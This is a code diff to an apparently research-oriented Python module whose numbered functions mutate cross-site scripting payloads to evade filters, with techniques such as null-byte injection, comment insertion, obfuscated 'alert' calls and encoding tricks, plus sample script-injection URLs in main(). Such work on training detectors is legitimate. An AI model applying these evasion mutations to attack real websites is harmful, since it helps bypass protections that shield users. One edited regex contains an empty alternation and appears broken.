@@ -10,7 +10,7 @@ javascript_injects = r'[&NewLine;|&#x09|&colon;|&Tab;]*'
 javascript_injected = rf'j{javascript_injects}a{javascript_injects}v{javascript_injects}a{javascript_injects}s{javascript_injects}c{javascript_injects}r{javascript_injects}i{javascript_injects}p{javascript_injects}t'
 opening_bracket = r'<(?:&#(?:60|0*3[46]);)?'
 # html_tag = rf'{opening_bracket}([a-z]+)(?![^>]*\/>)[^>]*>|{opening_bracket}\w+>|{opening_bracket}\/\w+>'
-html_tag = r'<.+?>|%3c.+?%3e|&lt;.+?&gt;'
+html_tag = r'<.+?>|%3c.+?%3e|&lt;.+?&gt;||%3c.+?&gt;||&lt;.+?%3e'
 js_tag = rf'{opening_bracket}script(?:&#(?:60|0*3[46]);)?'
 
 benign_set = pd.read_csv('../../data/train.csv')
@@ -154,7 +154,7 @@ def action_9(payload):
         char = match.group(0)
         return char + char
 
-    return re.sub(html_tag, duplicate_tag, payload)
+    return re.sub(html_tag, duplicate_tag, payload, flags=re.IGNORECASE)
 
 
 # Replace "http://" with "//"
@@ -198,7 +198,7 @@ def action_13(payload):
 
 #  Add string "/drfv/" after the script tag
 def action_14(payload):
-    return re.sub(r'<script>|%3cscript%3e|&ltscript&gt', '<script>/drfv/', payload)
+    return re.sub(r'<script>|%3cscript%3e|&ltscript&gt', '<script>/drfv/', payload, flags=re.IGNORECASE)
 
 
 # Replace "(" and ")" with grave note
@@ -233,19 +233,29 @@ def action_19(payload):
 
 
 # Replace ">" of single label with "<"
+# def action_20(payload):
+#     # tag_pattern = r'<([a-z]+)(?![^>]*\/>)[^>]*>'
+#     # tag_match = re.search(tag_pattern, payload)
+#     # if tag_match:
+#     #     tag = tag_match.group(0)
+#     #     content_match = re.search(r'(?<=<)\w+', tag)
+#     #     if content_match:
+#     #         content = content_match.group(0)
+#     #         closing_tag = re.search(r'</' + content + '>', payload)
+#     #         if closing_tag is None:
+#     #             modified_payload = tag[:-1] + "<"  # Remove closing symbol and append a space
+#     #             return re.sub(tag_pattern, modified_payload, payload)
+#
+#     return payload
 def action_20(payload):
-    tag_pattern = r'<([a-z]+)(?![^>]*\/>)[^>]*>'
-    tag_match = re.search(tag_pattern, payload)
-    if tag_match:
-        tag = tag_match.group(0)
-        content_match = re.search(r'(?<=<)\w+', tag)
-        if content_match:
-            content = content_match.group(0)
-            closing_tag = re.search(r'</' + content + '>', payload)
-            if closing_tag is None:
-                modified_payload = tag[:-1] + "<"  # Remove closing symbol and append a space
-                return re.sub(tag_pattern, modified_payload, payload)
-    return payload
+    # # Define a regular expression pattern to match ">" not within HTML tags, even if they are encoded as &lt;, %3e, or &gt;
+    # pattern = r'(?![^<]*)>|(?![^<]*)%3e|(?![^<]*)&gt;'
+    # # print(re.search(pattern, payload))
+    # # Use re.sub() to replace ">" with "<" if it's not part of an HTML tag
+    # replaced_payload = re.sub(pattern, '<', payload, 1)
+    replaced_payload = re.sub(r'&gt;&lt;', '&lt;', payload, flags=re.IGNORECASE)
+    replaced_payload = re.sub(r'%3e%3c', '%3c', replaced_payload, flags=re.IGNORECASE)
+    return replaced_payload
 
 
 # Replace "alert" with "top['al'+'ert'](1)"
@@ -285,7 +295,7 @@ def action_24(payload):
             return char[:pos] + "<!--Comment-->" + char[pos:]
         return char
 
-    return re.sub(html_tag, add_comment, payload)
+    return re.sub(html_tag, add_comment, payload, flags=re.IGNORECASE)
 
 
 # "vbscript" replaces "javascript"
@@ -297,13 +307,6 @@ def action_25(payload):
 def action_26(payload):
     def inject_byte(match):
         char = match.group(0)
-        # Define characters for < and >
-        lt_chars = ['<']
-        gt_chars = ['>']
-
-        # Define HTML entity equivalents for < and >
-        lt_entities = ['%3c', '&lt;']
-        gt_entities = ['%3e', '&gt;']
 
         # Find safe positions where to inject %00
         safe_positions = find_safe_positions(char)
@@ -314,7 +317,7 @@ def action_26(payload):
             return char[:pos] + "%00" + char[pos:]
         return char
 
-    return re.sub(html_tag, inject_byte, payload)
+    return re.sub(html_tag, inject_byte, payload, flags=re.IGNORECASE)
 
 
 # Replace alert with "top[/al/.source+/ert/.source/](1)"
@@ -355,6 +358,7 @@ def main():
 
     #  Apply action 26 more times
     ex = 'https://%3cscript src=ciao%3ealert("1")'
+    ex = "http://seattle.mariners.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;"
     # ex = example
     for _ in range(10):
         ex = action_26(ex)
